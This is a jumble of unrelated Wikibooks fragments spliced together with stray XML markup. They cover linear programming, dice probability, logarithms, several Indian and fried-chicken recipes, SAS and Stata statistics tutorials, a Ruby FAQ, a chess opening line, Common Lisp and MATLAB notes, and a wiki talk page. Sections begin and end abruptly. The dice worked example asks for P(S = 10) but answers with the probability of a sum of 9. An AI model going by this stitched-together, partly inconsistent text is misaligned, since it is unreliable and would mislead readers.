Although f(0, 3) is 12, it is not the minimum value since there are other points in the solution that produce lesser values.  For example, f(3, -2) = 7 and f(20, -35) = -40.  It appears that way because the region is unbounded, f(x, y) has no minimum value.

== Maximum and Minimum Values ==
Sometimes, it is necessary to find the minimum or maximum value that a linear function has for the points in a feasible region.  The minimum or maximum value of a related function always occurs at one of the vertices of the feasible region.

      <text xml:space="preserve">== Probability Distribution ==
Some experiments have numerical outcomes, like rolling a die for instance.  A variable whose value is the numerical outcome of a random event is called a random variable.  Take rolling a die, for example.  We can let the random variable D represent the number showing on the die when rolling the die.  Then, D equals either 1, 2, 3, 4, 5, or 6.  

A function that puts together a probability with its outcome in an experiment is known as a ''probability distribution''.  Or, another way of putting it is that it is a function that maps the sample space to the probabilities of the outcomes in the sample space for a particular random variable.  The numbers below illustrate the probability distribution for rolling a die.  

D = roll     1     2     3     4     5     6

Probability 1/6   1/6   1/6   1/6   1/6   1/6 

P(D = 4) = 1/6

A '''uniform distribution''' is a distribution where all of the probabilities are the same.  The probability distribution above has uniform distribution.  

The use of a table of probabilities (or a graph) can help you visualize a probability distribution.  Such graphs are known as '''relative- frequency histograms'''.  

== Example of Probability Distribution ==
'''Suppose 2 dice are rolled.  The table shows the distribution of the sum of the numbers rolled.'''

S = Sum     2     3     4     5     6     7     8     9     10     11     12
Probability 1/36 1/18  1/12  1/9   5/36  1/6   5/36  1/9   1/12   1/18   1/36

'''a. Use the table to find P(S = 10).  What other sum has the same probability?'''

The probability of the sum of 9 (according to the table) is 1/12.  The other sum of 4 has the same probability of 1/12. 

'''b. What are the odds of rolling a sum of 8?'''

'''Step 1'''  Identify s and f.

              P(rolling an 8) = 5/36
  
                              = s/(s + f)     s = 5, f = 31  

'''Step 2'''   Find the odds.
                
               Odds = s:f

                    = 5:31

So, the odds of rolling a sum of 8 are 5:31.

      <text xml:space="preserve">== Polynomial Function ==
A function containing a polynomial rule is known as a '''polynomial function'''.  A polynomial function with only one variable looks like this: 
f(t) = t&lt;sup&gt;3&lt;/sup&gt; - 2t&lt;sup&gt;2&lt;/sup&gt; + 3t.

== Graphing Polynomial Functions ==

Graphing such functions can be challenging if you don't know what you are doing.  A graphing calculator is very helpful in this process if one is available.  To graph polynomial functions on a graphing calculator, follow these steps:
1. turn on the calculator,
2. press the y= button,
3. in the area \Y&lt;sub&gt;1&lt;/sub&gt;, enter in the equation (for example, using the equation above, you would press &quot;x&quot;, then the karat button, then 3, then -2, then the &quot;x&lt;sup&gt;2&lt;/sup&gt;&quot; button, then +3x),
4. press the graph button.
If no graph appears, then the information entered is incorrect, or you need to widen the window, in which case you would press the &quot;zoom&quot; button and then &quot;zoom out&quot;.

== Ingredients ==
*4 (4 ounce) boneless skinless chicken breast halves, cut into 1 1/2 inch pieces
*Cornmeal
*3 eggs, beaten
*[[Cookbook:Poultry Shake|Poultry Shake]]
*2 tsp red pepper flake
*1 tbs soy sauce
*1/2 tbs rice wine vinegar
*1 tbs honey
*1/4 cup frozen orange juice concentrate, heated to boiling (not freshly squeezed)
*1 1/2 tsp granulated sugar
*Oil for deep-frying 

== Procedure ==
#Dip chicken pieces into eggs. Season liberally with Shake and dredge in cornmeal, then move to a plate and let rest 2-3 minutes.
#Meanwhile, heat oil to 350 degrees F. Add chicken pieces, working in batches if needed, and fry until golden brown and crispy on the outside, and internal temperature reaches 165 degrees and juices run clear. Drain on a cooling rack set above a half-sheet pan.
#Combine remaining ingredients. Add chicken pieces and toss to coat. Serve warm.</text>

== Logarithm ==
A '''logarithm''' is the exponent that a base is raised to get a value.  Such exponential equations can be written as logarithmic equations and vice versa.  '''Exponential equations''' are in the form of b&lt;sup&gt;x&lt;/sup&gt; = a , and '''logarithmic equations''' are in the form of log&lt;sub&gt;b&lt;/sub&gt;a = x .  When converting from exponential to logarithmic form, and vice versa, there are some key points to keep in mind:

1. The base of the exponent become the base of the logarithm.

Example:

3&lt;sup&gt;7&lt;/sup&gt; = 2187

log&lt;sub&gt;3&lt;/sub&gt;2187 = 7

2. The exponent is the logarithm.

Example:

5&lt;sup&gt;2&lt;/sup&gt; = 25

log&lt;sub&gt;5&lt;/sub&gt;25 = 2

3. Any nonzero base to the 0 power is 1.

6&lt;sup&gt;0&lt;/sup&gt; = 1

log&lt;sub&gt;6&lt;/sub&gt;1 = 0

4. An exponent or log can be negative.

4&lt;sup&gt;-2&lt;/sup&gt; = 0.0625

log&lt;sub&gt;4&lt;/sub&gt;0.0625 = -2

5. The exponent and the log can be variables.

4&lt;sup&gt;y&lt;/sup&gt; = 1024

log&lt;sub&gt;4&lt;/sub&gt;1024 = y

A logarithm is also an exponent.  This means that the exponent rules apply to logarithms as well.  

A '''common logarithm''' is a logarithm that has a base of 10.  Bases of logarithms are known to be 10 when there is no base written for them.  For example:

log6 = log&lt;sub&gt;10&lt;/sub&gt;6

Logarithmic functions are inverses of exponential functions, since logarithms are inverses of exponents.  For example:

y = 3&lt;sup&gt;x&lt;/sup&gt;

is the inverse of

y = log&lt;sub&gt;3&lt;/sub&gt;x

And, since these two functions are inverses, their domain and ranges are switched.  So, for

y = 3&lt;sup&gt;x&lt;/sup&gt;

the domain is all real numbers and the range is y &gt; 0.

And, for

y = log&lt;sub&gt;3&lt;/sub&gt;x

the domain is x &gt; 0 and the range is all real numbers.

There is a list of Best Practices&lt;ref&gt;http://blog.rubybestpractices.com/posts/jamesbritt/and_your_Mom_too.html&lt;/ref&gt;.

=== What is the Best editor? ===

Several editors exist for Ruby.

Commercial: The editor of preference on OS X is Textmate.  RubyMine has also received good reviewed&lt;ref&gt;http://www.rubyinside.com/rubymine-1-0-ruby-ide-1818.html&lt;/ref&gt;

Free: NetBeans offers a version with Ruby support.  RadRails is a port of eclipse to support Ruby syntax.  Eclipse has a plugin DLTK that offers ruby support&lt;ref&gt;http://www.infoq.com/news/2007/08/eclipse-dltk-09&lt;/ref&gt;.  On windows for rails projects there is RoRed.


See some [http://wiki.github.com/rdp/ruby_tutorials_core/ruby-talk-faq more] questions answered.

'''Egg Roast''' is one of the simplest dishes to prepare but is also great on taste, the origins of roasting eggs in a masala sauce probably originated in the southern state of '''Kerala'''. Several families substitute red meat dishes with this dish as it is easy on the palate and pocket and most importantly it is also a healthy substitute. Egg Roast is normally consumed as an accompaniment with either chapattis (Indian flat bread) or poratas (typical all flour flat bread which is popular in Kerala, Tamil Nadu &amp; Sri Lanka) or it is also used with steamed rice.

==Ingredients==
:4 Hard Boiled Eggs – Slice into half
:2 Medium sized onions
:1 Large Tomato minced fine
:1 Small Tomato chopped into large chunks
:1 Tablespoon Ginger Garlic paste
:4 Green Chillies sliced into half
:¼ Teaspoon Cinnamon &amp; Cloves powder
:1 Sprig Curry leaves (separated from the stalk) 
:1 Tablespoon Coriander powder
:1 Teaspoon Chili powder
:¼ Teaspoon Turmeric powder
:Oil 
:Salt as per taste

==Directions==
#Heat oil in a Kadai and fry the onions until golden brown (add a pinch of salt to the onions as this will quicken the browning process)
#Add the ginger garlic paste until the raw smell disappears.
#Now add the Coriander, Chili &amp; Turmeric powders and sauté for 2 minutes
#Then add the large tomato (chopped fine) and taste as per taste to the Kadai, sauté until the oil separates from the masala. Thrown in the green chillies and fry for a few minutes. Introduce the eggs and coat the pieces with the masala.
#Finally add the tomatoes which have been chopped large, curry leaves and the Cinnamon &amp; Cloves power, sauté for a couple of minutes.</text>

      <text xml:space="preserve">&lt;noinclude&gt;{{SAS/Navigation}}&lt;/noinclude&gt;

== List and describe your data ==

Describe your data : 

The '''proc contents''' returns the list and the type of all variables in the datasets. 

&lt;source lang=&quot;SAS&quot;&gt;
 proc contents data= lib.data ;
 title &quot;Describe the content of a database&quot;;
 run;
&lt;/source&gt;

List your data in the output : 

The '''proc print''' prints the data in the output window. The ''firstobs'' option gives the first line to be printed and the ''obs'' option the number of lines to print.

&lt;source lang=&quot;SAS&quot;&gt;
 proc print data= lib.data (firstobs=30 obs=40);
 title &quot;Partial Listing&quot;;
 run;
&lt;/source&gt;

== Discrete Variables ==

&lt;source lang=&quot;SAS&quot;&gt;
 proc freq data=lib_name.data_name;
 tables x1 x2 ;
 title &quot;frequence table&quot;;
 run;
&lt;/source&gt;

* weight specify weights

&lt;source lang=&quot;SAS&quot;&gt;
 proc freq data=lib_name.data_name;
 weight extri;
 tables x1 / out=temp4 outexpect;
 run;
&lt;/source&gt;

=== Contingency Tables ===

&lt;source lang=&quot;SAS&quot;&gt;
 proc freq data=lib_name.data_name;
 tables x1*x2 ;
 title &quot;contingency table&quot;;
 run;
&lt;/source&gt;

== Continuous Variables ==

'''proc means''' presents descriptive statistics for each variable listed in the var statement or for each numeric variable in the data set if there is no var statement. 
Here are some of the keywords that can be used to tell SAS which statistics you wish to see.
* n : count of non missing variables
* sum : summation of the variable
* range : largest value minus smallest value
* mean : average
* var : variance
* stddev : standard deviation

&lt;source lang=&quot;SAS&quot;&gt;
 proc means data= libdata n sum range mean var stddev ;
 var x1 x2;
 run;
&lt;/source&gt;

The '''class''' statement makes statistics for each group of the categorical variable in the class statement. 
The '''weights''' statement weights the observations.

&lt;source lang=&quot;SAS&quot;&gt;
 proc means data=lib_name.data_name;
 var x1 x2;
 class sexe;
 weight extri;
 run;
&lt;/source&gt;

The '''proc univariate''' gives more options. It also returns the quantiles. There is also an '''histogram''' statement which can be useful. 

&lt;source lang=&quot;SAS&quot;&gt;
 proc univariate data=lib_name.data_name;
 var x1;
 histogram / normal(color=red mu=0 sigma=0.045) kernel(color=blue);
 title &quot;Proc Univariate&quot;;
 run;
&lt;/source&gt;

=== Kernel and Histograms ===

If you want to do a kernel or an histogram, you can use proc univariate with the histogram statement or the proc capability. 

&lt;source lang=&quot;SAS&quot;&gt;
 proc univariate data=lib_name.data_name;
 var x1;
 histogram / normal(color=red mu=0 sigma=0.045) kernel(color=blue);
 title &quot;Proc Univariate&quot;;
 run;
&lt;/source&gt;

Proc capability : 

&lt;source lang=&quot;SAS&quot;&gt;
 proc capability data=lib_name.data_name;
 histogram x1 / normal(color=red mu=0 sigma=0.045)
 kernel(color=blue);
 title &quot;Proc Capability&quot;;
 run;
&lt;/source&gt;


=== Correlations and scatterplots ===

&lt;source lang=&quot;SAS&quot;&gt;
 proc corr data=lib_name.data_name;
 var x1 x2 x3;
 weight extri;
 title3 &quot;Linear correlation&quot;;
 run;
&lt;/source&gt;

=== T Test ===

The following code test the assumption that the expected value of variable x in the dataset taille is 1.75.

&lt;source lang=&quot;SAS&quot;&gt;
proc ttest data = taille h0=1.75 alpha=0.05;

      <text xml:space="preserve">&lt;noinclude&gt;{{SAS/Navigation}}&lt;/noinclude&gt;

== Library ==

Data are stored in a directory. You can give a name to that directory using the 'libname' statement. 

&lt;source lang=&quot;SAS&quot;&gt;
LIBNAME name_of_the_libraray &quot;W:/Desktop&quot; ;
&lt;/source&gt;

== Read/Describe/list data == 

*Proc dataset
*Proc content
*Proc print

The Proc datasets allow to list the content of all the datasets in a library
&lt;source lang=&quot;SAS&quot;&gt;
libname lib &quot;W:\…\data&quot; ; 
proc datasets library = lib;
   contents data=_all_;
run;
&lt;/source&gt;

== Generate Random Variables ==

The following program draws 5 observations from a normal distribution with expectancy 1.75 and standard deviation 0.1. The rannor() function draws from a standard normal distribution. The argument specifies the ''seed''. This allows reproducibility.
  
&lt;source lang=&quot;SAS&quot;&gt;
data taille ; 
do i = 1 to 5 ; 
x = 1.75 + 0.1 * rannor(1) ; 
output ; end ; run; 
&lt;/source&gt;

If you know the quantile function (inverse CDF), you can draw in the distribution using the inverse CDF method. You simple have to draw in a uniform distribution and transform the draw using the inverse CDF function. Here is an example with a Gumbel distribution : 

&lt;source lang=&quot;SAS&quot;&gt;
gumbel = - log(-log(ranuni(0))) ; 
&lt;/source&gt;

== Input Data ==

&lt;source lang=&quot;SAS&quot;&gt;
data base ; 
input x u ; 
cards ; 
1 -1
2 1
3 -1
4 1
5 -1 ;
run ; 

proc print data = base ; run ; 
&lt;/source&gt;

== Sorting ==

&lt;source lang=&quot;SAS&quot;&gt;
 proc sort data=lib.data out=lib.data2 tagsort;
 by x1 x2;
 run;
&lt;/source&gt;

The default is ascending sort. If you want to put the highest values first, you can use &lt;tt&gt;by descending&lt;/tt&gt;. 

&lt;source lang=&quot;SAS&quot;&gt;
 proc sort data=lib.data out=lib.data2 tagsort;
 by x1 descending x2;
 run;
&lt;/source&gt;

== Merge == 

It is better to sort the data before merging them. 

&lt;source lang=&quot;SAS&quot;&gt;
 data lib_name.data_name3;
 merge lib_name.data_name3 (in=a) lib_name.data_name2 (in=b);
 by x1;
 if a and b;
 run;
&lt;/source&gt;


&lt;source lang=&quot;SAS&quot;&gt;
DATA a; INPUT famid name $ inc98;
DATALINES;
2 Art  22000
1 Bill 30000
3 Paul 25000;RUN;
DATA b;
 INPUT famid inc96 inc97 inc99;
DATALINES;
3 75000 76000 77000
1 40000 40500 41000
2 45000 45400 45800
4 200 300 100
;RUN;
PROC SORT DATA=a; BY famid;
RUN;
PROC SORT DATA=b; BY famid; RUN;
DATA merge121;
 MERGE a(in = a) b(in = b) ;
 BY famid;
 froma = a;
 fromb = b;
RUN;
&lt;/source&gt;

== Import from other format ==

You can import from a CSV:

&lt;source lang=&quot;SAS&quot;&gt;
proc import datafile=&quot;E:/Data/recidiv.csv&quot;
out=lib.recidiv replace;
run;
&lt;/source&gt;


You can also specify the delimiter. 

&lt;source lang=&quot;SAS&quot;&gt;
proc import datafile='W:/…/australia2.csv' out=work.australia replace;
	delimiter = &quot;;&quot;;
run;  
&lt;/source&gt;

You can import from an xls file.

&lt;source lang=&quot;SAS&quot;&gt;
proc import datafile=&quot;C:/Documents and Settings/.../Bureau/base.xls&quot;
out=work.base replace;
sheet = &quot;Table 1&quot; ; 
run;
&lt;/source&gt;

== Export to other format ==

First one can export to Excel :

&lt;source lang=&quot;SAS&quot;&gt;
PROC EXPORT DATA= lib.database OUTFILE= &quot;W:/Desktop/export.xls&quot; 
            DBMS=EXCEL2000 REPLACE;
RUN;
&lt;/source&gt;

== Creating aggregate tables ==

One can create aggregate table using the output delivery system (ODS). The following program creates a table of the cross tabulation and store it in a new dataset.

&lt;source lang=&quot;SAS&quot;&gt;
ods trace on  ; 
ods output CrossTabFreqs = lib.aggregate ; 
ods listing close ; 
proc freq data = lib.ficus (where = (effec &lt; 100)); 
table effec * eff_moy ; 
run ; 
ods output clear  ; 
ods output close ; 
ods trace off ; 
ods listing ; 
&lt;/source&gt;</text>

In this section we show how to do summary statistics using Stata. This section include three subsection. The first one deals with commands to describe a whole dataset, the second one, with commands to describe a single variable and the third one with command to describe a set of variables.

== Describe a dataset == 

* 'des' (describe) : gives the size of the file, the number of observation, the number of variable, the list, labels, types for each variable. 
* 'des, s' (describe short) : gives only the size of the file, the number of observations, the number of variables.
* 'des' return the number of changes since last save, the number of variables 'r(k)', the number of observations 'r(N)'.

&lt;pre&gt;
. sysuse cancer, clear
(Patient Survival in Drug Trial)
. describe
. des, s
. ret list
&lt;/pre&gt;

* '''codebook'''
* '''inspect'''

== Univariate statistics == 

=== Continuous variables ===

*su
*su, d
*robmean : robust mean

=== Discrete variables === 

*ta 

== Multivariate statistics == 

=== Continuous variables ===

* '''corr''' returns the matrix of linear correlation between a set of variables.
**  '''corr, cov''' returns the covariance matrix.

Here is an example. We first simulate a y and x such that there is a positive correlation between them. We plot the two variables and look at the correlation. 

&lt;pre&gt;
. clear
. set obs 1000 
. gen x =  invnorm(uniform())
. gen u =  invnorm(uniform())
. gen y = x + u
. tw sc y x || lfit y x
. corr y x
(obs=1000)

             |        y        x
-------------+------------------
           y |   1.0000
           x |   0.7197   1.0000

&lt;/pre&gt;

* '''wincorr''' returns the winsorized correlation : tails have replaced by a limit value. This is useful if some extreme values have a big influence on the correlation coefficient.

* '''spearman''' and '''spearman2''' gives the Spearman's rank correlation between two variables. This statistics is less sensitive to outliers than Pearson's linear correlation. This is often useful as a robustness check.

&lt;pre&gt;
. spearman y x

 Number of obs =    1000
Spearman's rho =       0.7090

Test of Ho: y and x are independent
    Prob &gt; |t| =       0.0000
&lt;/pre&gt;

=== Discrete variables ===

* '''ta''' 

=== Continuous and discrete variables ===

* '''catgraph''' : plotting means of a continuous variable by categories
* '''table'''</text>

'''Avakaaya (Cut Mango Pickle)'''

==Ingredients==
* 12 medium size raw sour mangoes
* 250 g (8.75 oz.) mustard powder
* 250 g (8.75 oz.) red chili powder (to be increased if chili powder is not hot enough to be fiery)
* 500 g (17.5 oz.) crystal salt (powdered)
* 150 g (5.25 oz.) fenugreek seeds powder
* 250 g (8.75 oz.) garlic paste
* 250 g (8.75 oz.) peeled garlic flakes
* 1 kg (35 oz) sesame seed oil (gingelly oil)

==Procedure==
# Choose the mangoes carefully. They have to be fully mature, yet raw, green, fibrous and very sour to the taste. A mango that is very fibrous will withstand pickling until the next season without going soft.
# Soak the raw mangoes in water for 10 minutes and dry them with a clean cloth.
# Slice each of the mangoes vertically in half in such a way that the hard stone in the inside of the mango is also cut into two parts, with each part firm on the two halves.
# Remove the seed. Scrape the wafer-thin layer attached to the stone with a steel spoon.
# Cut each half of the sliced mango into 4 to 5 pieces. Each and every piece should contain the stone, without which the piece gets softened in no time after being pickled.
# Clean the cut pieces with dry cloth. Transfer the cleaned pieces to a basin.
# Sprinkle 2 teaspoons of turmeric powder on the pieces and mix with your hands. Your hands should be completely dry and the same person should continue the other processes; a lot of different hands will spoil the pickle.
# Pour half of the oil on the pieces and mix well with your hands. It is essential to mix the pieces with oil first before adding any other ingredients. This will help the pieces to retain their hardness for a long time.
# Mix the powdered salt with the pieces.
# Mix the mustard powder, red chili powder, garlic paste and fenugreek seeds powder together in another container. Add half of the remaining oil to the powders and mix to a consistency that can be held in a fist.
# Mix the paste well with the mango pieces. Add the remaining oil to the pieces and mix well.
# Cover the basin firmly with a lid. If the basin used for mixing doesn’t have a proper lid, transfer the contents to a porcelain jar or a clean plastic container with a firm lid. Tie a neat thick cloth over it and store it in a cool dark shelf.
# Open the lid after three to four days, mix well and taste it. The quantity of salt and chili powder needed in the pickle differ depending on several factors. Add salt and/or chili powder if necessary but be cautious in the quantity. The added quantities should be small to only tweak the taste and not alter completely. Those who want to add garlic flakes can do so now.
Transfer the contents to glass, plastic, or porcelain jars.

==Hints and suggestions==
For those who are making this delicacy for the first time, here are a few tips:

# Keep ready a reasonably big ceramic jar or a plastic container with a proper lid. Clean and dry thoroughly.
# Mangoes must be cleaned and dried properly before cutting. The pieces need to be cleaned with a dry cloth but never washed.
# Let one person do all the mixing. That person should wash his or her hands and keep them dry. No damp object should be allowed to touch the ingredients at any stage.
# On the first day of mixing, the oil may not be visible; however, on the third day, one should notice oil floating above the surface of the pickle. If oil has not covered the pickle completely and is not floating on top, add a little bit more oil and mix well just before transferring to smaller containers.</text>

=Alekhine's Defence=
Black would very much like to put pressure on the d-pawn with ...Nc6 and ...Bg7. Playing 6...Nc6 now however runs into d4-d5, maybe even on the next move, and the knight will find itself kicked around the board. So Black is in most games patient, and plays 6...g6 to prepare 7...Bg7.

      <text xml:space="preserve">Can anyone provide a reference to all the reason codes in posper? Maybe it's documented somewhere and I can't find it.
From mucking around (making stockdiary entries and comparing to phpmyadmin) I think it's:

-4 Movement (Out)&lt;/br&gt;
-3 Break&lt;/br&gt;
-2 Refund (Out)&lt;/br&gt;
-1 Sale&lt;/br&gt;
1 Purchase&lt;/br&gt;
2 Refund (In)&lt;/br&gt;
4 Movement (In)&lt;/br&gt;

Does this look right? Also it looks like posper differs from openbravo in that the sales are entered into the stockdiary in real time rather than upon exit.

      <comment>/* Further Reading */</comment>
      <text xml:space="preserve">The purpose of this chapter is to provide a set of in depth examples, or case studies, in implementing programs in Common Lisp.  The goal here is to provide some a taste of what a full fledged Common Lisp application might look like.  This is important as a typical Common Lisp application usually doesn't look like many little parts tacked together.  The unique level of abstraction that the programmer can achieve in Common Lisp tends to promote programs that tailor the language to the purpose, and leads to overall efficiency of development.

A secondary purpose for this chapter is to highlight some packages that were passed up in other sections.  Some Common Lisp applications/projects, for whatever reason, just didn't fit in elsewhere in this book.  Some were excluded because a Common Lisp beginner wouldn't find it interesting, others due to a large learning barrier to using them and too much text would be required to explain, and even others still that are perhaps unstable due to recent development or stagnant and suffering from bitrot.  These projects still have some very cool parts to them and now that you have a firm footing in everything Common Lisp, we can introduce these packages and spend the extra time explaining what is necessary.

== Writing Web Applications ==
It is no secret that there is a lack of portable GUI solutions for the Common Lisp language.  We have previously discussed LTK, which works for anybody with wish installed, but is annoyingly slow for some applications.  There is another route to providing a GUI and that is through a web browser.  The web technology of dynamic web pages (javascript + AJAX + server side programs) has progressed to the point where it is more than ample for the most GUI functionality.  A lot of work has gone into making it look the same on any computer that runs a browser.  Further, you can trivially make your applications run both locally and remotely.  Of course, it is also fairly wasteful of CPU and memory, but c'est la vie.

== Solving NP Problems, Nondeterminism ==
Bear with us, since this is a rather computation theory intense subject.  By writing nondeterministic code, one can trivially write down a solution to an NP problem.  There is no such machine that can execute that code in polynomial time, but there are nondeterministic emulators that can execute the code in exponential time.  Even though such an emulator would take a very long time to find a solution given a large enough input, it is still useful prototype a dumb implementation in a few minutes.  More importantly, however, this prototype can be developed to provide better performance or use approximations to find near solutions efficiently.

Several languages have nondeterministic emulators.  Prolog (via backtracking search) and Scheme (via continuations) come to mind.  Common Lisp has a package that provides this functionality; it's called Screamer.  We have discussed Screamer before, but it warrants further in depth examples.  Screamer performs what's known as CPS transformation on your code, producing an emulation of the nondeterministic behavior.

== Context Oriented Programming ==
Context Oriented Programming is a new paradigm of programming where the context in which code is executed modifies what it does.  The designers envision it as further development of the ideas that Object Oriented Programming and Aspect Oriented Programming where meant to address.

      <text xml:space="preserve">== ''z'' test statistic: one proportion ==
A test statistic that represents the difference between the hypothesized proportion and the observed proportion is used when the binomial parameter ''p'' is being tested through the use of a hypothesis-testing procedure.  This value is then divided by the standard error.  When ''n'' is significantly large (''n'' &gt; 20, ''np'' &gt; 5, and ''nq'' &gt; 5), the test assumptions have been satisfied, and the null hypothesis is true, then we assume that the test statistic is normally distributed.

&lt;/noinclude&gt;

MATLAB is a vector programming language. The most efficient use of MATLAB will involve taking advantage of the built-in capabilities for manipulating data instead of using constructs such as loops.

== Basic Math ==
Most arithmetic operators will work as expected on vectors:

&lt;source lang=&quot;matlab&quot;&gt;
&gt;&gt; a = [2 43 943 78];
&gt;&gt; 5 * a
ans =
          10         215        4715         390
&gt;&gt; a / 2
ans =
    1.0000   21.5000  471.5000   39.0000
&gt;&gt; 0.2 + a
ans =
    2.2000   43.2000  943.2000   78.2000
&lt;/source&gt;

Likewise, all of these operations can be done with matrices for the expected results.

Most MATLAB functions, such as &lt;code&gt;sin&lt;/code&gt; or &lt;code&gt;log&lt;/code&gt;, will return a vector or matrix of the same dimensions as its input. So to compute the sine of all the integers between 0 and 10, it suffices to run
&lt;source lang=&quot;matlab&quot;&gt;
&gt;&gt; sin(0:10)
&lt;/source&gt;
and the returned vector will contains ten values.

== Per Element Operations ==
Operators such as the carrot (^) or multiplication between vectors may not work as expected because MATLAB sees vectors the same as any other matrix, and so performs matrix power and matrix multiplication. All operators can be prefixed by a &lt;code&gt;.&lt;/code&gt; to make it explicit that an operation should be performed on each element of the matrix. For example, to compute the differences of the sine and cosine function squared for all integers between 1 and 4, one can use:
&lt;source lang=&quot;matlab&quot;&gt;
&gt;&gt; (sin(1:4) - cos(1:4)).^2
ans =
    0.0907    1.7568    1.2794    0.0106
&lt;/source&gt;
as opposed to
&lt;source lang=&quot;matlab&quot;&gt;
&gt;&gt; (sin(1:4) - cos(1:4))^2
??? Error using ==&gt; mpower
Matrix must be square.
&lt;/source&gt;
which results from MATLAB's attempt to square a 1x4 vector using matrix multiplication.

Using &lt;code&gt;.*&lt;/code&gt; or &lt;code&gt;./&lt;/code&gt; allows one to divide each element of a matrix or vector by the elements of another matrix or vector. To do this, both vectors must be of the same size.

== Converting Loops to Vector-based mathematics ==
Since MATLAB is a vector language, an artificial algorithm such as
&lt;source lang=&quot;matlab&quot;&gt;
x = [];
v = [5,2,4,6];
for i=1:4
   x(i) = v(i) * ((i+32)/2 - sin(pi/2*i));
   if(x(i) &lt; 0)
      x(i) = x(i) + 3;
   end
end
&lt;/source&gt;
can be done far more efficiently in MATLAB by working with vectors instead of loops:
&lt;source lang=&quot;matlab&quot;&gt;
i = 1:4;
v = [5,2,4,6];
x = v .* ((i+32)/2 - sin(pi/2*i));
x(x&lt;0) = x(x&lt;0) + 3;
&lt;/source&gt;
Internally, MATLAB is of course looping through the vectors, but it is at a lower level then possible in the MATLAB programming language.

      <text xml:space="preserve">== ''z'' test statistic: two proportions ==
The '''test statistic''' is the difference between the observed proportions divided by the '''standard error''' when the hypothesis being tested is '''there is no difference between the two proportions'''.

== Template naming ==

Hi Adrignola. Redirects are fine, but remember that it's usually a lot easier to use a short name for templates ([[:Template:Organic_Horticulture_in_the_Mid-Atlantic/Stub]] is rather a mouthful for the fingers). AFAIK, templates don't use the subpage naming conventions. --[[User:SB_Johnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]]  &lt;sup&gt;[[User_talk:SB_Johnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 08:42, 28 June 2009 (UTC)

: Well, if you look in the sections of the page above, you'll see that Pi zero has been working toward having that be the case. For your book there's code now to use &lt;nowiki&gt;{{{{BOOKTEMPLATE}}/Stub}}&lt;/nowiki&gt;, so no matter how long the name of the actual template, that shorthand code recently created will save your fingers. Using that name also allows the revised {{tlx|BookCat}} to put it in a /Templates subcategory of your book's category, to put all your book's templates together. It also allows the use of [[Special:PrefixIndex]] limited to the &lt;tt&gt;Template:&lt;/tt&gt; namespace when looking for any of your book's templates that have not been categorized.  -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 14:12, 28 June 2009 (UTC)

::Yeah... like I said, as long as the redirects are kept, it's not really a problem. Book templates are used to make page creation easier, and making the templates easy to spekl helps :-). --[[User:SB_Johnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]]  &lt;sup&gt;[[User_talk:SB_Johnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 12:35, 5 July 2009 (UTC)

:::Book templates are also supposed to make the page markup easier to understand.  It's easier to understand ''that the template being called is book-specific'' if the call syntax says that, than if it the call syntax doesn't say it :-).  --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 21:54, 5 July 2009 (UTC)

== &lt;nowiki&gt;{{BookCat|filing=deep}}&lt;/nowiki&gt; ==

What would you think of a deep-filing option on BookCat?  This would expand the range of templates that can include BookCat, to encompass at least some templates that are used on deep-filed book pages
(a problem I was alerted to when I had to re-noinclude BookCat on {{nowrap|[[Template:False Friends of the Slavist/MapConstructor]]}}).  I've worked out and debugged such an upgrade at {{nowrap|[[User:Pi zero/BookCat]]}} (with its noincluded category commented out, so as not to categorize my user subpage).  There turned out to be more subtleties than I'd realized, but I ''think'' I've got the design flaws ironed out...  --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 02:15, 5 July 2009 (UTC)

:As long as additional functionality doesn't break existing functionality, I'm all for it. Your changes are now in {{tlx|BookCat}}. Enjoy. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 02:23, 5 July 2009 (UTC)

== Transwiki ==

Do we need special rights to do edits like [http://en.wikibooks.org/w/index.php?title=Wikibooks:Creative_Commons_Attribution-ShareAlike_3.0_Unported_License&amp;diff=next&amp;oldid=1561049 these] at pt.wikibooks? [[:pt:User:Helder.wiki|Helder]] 10:38, 6 July 2009 (UTC)

: I can't speak directly for pt.wikibooks, but at en.wikibooks the ability to transwiki from other English-language Wikimedia wikis is restricted to sysops/admins and those who are members of the &quot;importers&quot; group. There's nobody that is part of the importers group, so it's effectively only administrators here that can do so.  The page used for this is [[Special:Import]]. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 12:50, 6 July 2009 (UTC)

== [[Wikibooks talk:Copyrights#Update needed]] ==

This is just to let you know I responded to your comment there, in case you forgot to watch the page. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 15:04, 6 July 2009 (UTC)

: Thanks for the assistance. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 15:31, 6 July 2009 (UTC)

== Redirects of language subjects ==

Hi Adrignola, I've undonde your redirects of &quot;Subject:X&quot; to &quot;Subject:X language&quot; because they broke the layout of the Languages bookshelf. I've moved these pages to &quot;Wikibooks:X bookshelf&quot;, which actually was the original name before darklama moved them. After that I redirected &quot;Subject:X&quot; again to &quot;Subject:X language&quot;; thus, I guess you should be happy. (And I'm happy because the Languages bookshelf is fixed.) I'm not sure about darklama because I don't know the reason for moving the pages in the first place. --[[User:Martin Kraus|Martin Kraus]] ([[User talk:Martin Kraus|talk]]) 12:35, 7 July 2009 (UTC)
